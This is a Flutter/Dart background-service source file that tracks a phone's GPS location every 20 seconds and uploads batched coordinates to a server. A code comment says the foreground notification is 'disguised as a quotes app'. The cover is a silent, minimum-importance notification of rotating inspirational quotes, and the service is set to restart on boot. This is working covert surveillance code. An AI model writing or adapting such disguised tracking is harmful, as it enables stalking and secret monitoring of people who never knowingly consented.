import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'api_service.dart';

const notificationChannelId = 'locus_quotes';
const notificationId = 888;
const queueKey = 'offline_location_queue';
const serviceRestartKey = 'service_should_be_running';

// Inspirational quotes to display in the notification
const List<String> _quotes = [
  "The only way to do great work is to love what you do.",
  "Innovation distinguishes between a leader and a follower.",
  "Stay hungry, stay foolish.",
  "Life is what happens when you're busy making other plans.",
  "The future belongs to those who believe in the beauty of their dreams.",
  "In the middle of difficulty lies opportunity.",
  "Success is not final, failure is not fatal.",
  "Be yourself; everyone else is already taken.",
  "The best time to plant a tree was 20 years ago. The second best time is now.",
  "Do what you can, with what you have, where you are.",
  "It does not matter how slowly you go as long as you do not stop.",
  "Everything you've ever wanted is on the other side of fear.",
  "Believe you can and you're halfway there.",
  "The only impossible journey is the one you never begin.",
  "What lies behind us and what lies before us are tiny matters.",
  "Happiness is not something ready made. It comes from your own actions.",
  "Turn your wounds into wisdom.",
  "The mind is everything. What you think you become.",
  "An unexamined life is not worth living.",
  "We become what we think about.",
];

String _getRandomQuote() {
  return _quotes[Random().nextInt(_quotes.length)];
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    notificationChannelId,
    'Daily Inspiration',
    description: 'Inspirational quotes to brighten your day.',
    importance: Importance.min, // Minimum importance - no sound, no popup
    showBadge: false,
    enableVibration: false,
    playSound: false,
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: false,
      isForegroundMode: true,
      notificationChannelId: notificationChannelId,
      initialNotificationTitle: 'Daily Inspiration',
      initialNotificationContent: _getRandomQuote(),
      foregroundServiceNotificationId: notificationId,
      autoStartOnBoot: true, // Auto restart on boot
    ),
    iosConfiguration: IosConfiguration(
      autoStart: false,
      onForeground: onStart,
      onBackground: onIosBackground,
    ),
  );
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  final apiService = ApiService();

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  // Show an inspirational quote in the notification (disguised as a quotes app)
  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: "✨ Daily Inspiration",
      content: _getRandomQuote(),
    );
    
    // Mark service as running for restart capability
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool(serviceRestartKey, true);
  }

  // Change quote periodically (every 5 minutes)
  Timer.periodic(const Duration(minutes: 5), (timer) async {
    if (service is AndroidServiceInstance) {
      service.setForegroundNotificationInfo(
        title: "✨ Daily Inspiration",
        content: _getRandomQuote(),
      );
    }
  });

  Timer.periodic(const Duration(seconds: 20), (timer) async {
    final prefs = await SharedPreferences.getInstance();
    final sessionId = prefs.getString('current_session_id');
    final endTimeMillis = prefs.getInt('session_end_time');

    if (sessionId != null && endTimeMillis != null) {
      if (DateTime.now().millisecondsSinceEpoch < endTimeMillis) {
        try {
          final position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high,
          );
          
          final newLocation = {
            'sessionId': sessionId,
            'latitude': position.latitude,
            'longitude': position.longitude,
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          };

          // Add to queue
          List<String> queue = prefs.getStringList(queueKey) ?? [];
          queue.add(jsonEncode(newLocation));
          await prefs.setStringList(queueKey, queue);

          // Try to flush queue
          if (queue.isNotEmpty) {
            final List<Map<String, dynamic>> batch = queue
                .map((e) => jsonDecode(e) as Map<String, dynamic>)
                .toList();

            print('Attempting to send ${batch.length} locations...');
            final success = await apiService.sendLocations(batch);

            if (success) {
              print('Successfully sent batch.');
              await prefs.setStringList(queueKey, []);
            } else {
              print('Failed to send. Keeping in queue.');
            }
          }

        } catch (e) {
          print('Error in tracking loop: $e');
        }
      } else {
        // Session expired
        print('Session expired. Stopping service.');
        service.stopSelf();
        await prefs.remove('current_session_id');
        await prefs.remove('session_end_time');
      }
    } else {
       // No active session, stop service
       final prefs = await SharedPreferences.getInstance();
       await prefs.setBool(serviceRestartKey, false);
       service.stopSelf();
    }
  });
}

// Helper to check if service should restart
Future<bool> shouldServiceRestart() async {
  final prefs = await SharedPreferences.getInstance();
  return prefs.getBool(serviceRestartKey) ?? false;
}

// Helper to request battery optimization exemption
Future<void> requestBatteryOptimizationExemption() async {
  // This is handled in the main app via permission_handler or similar
}
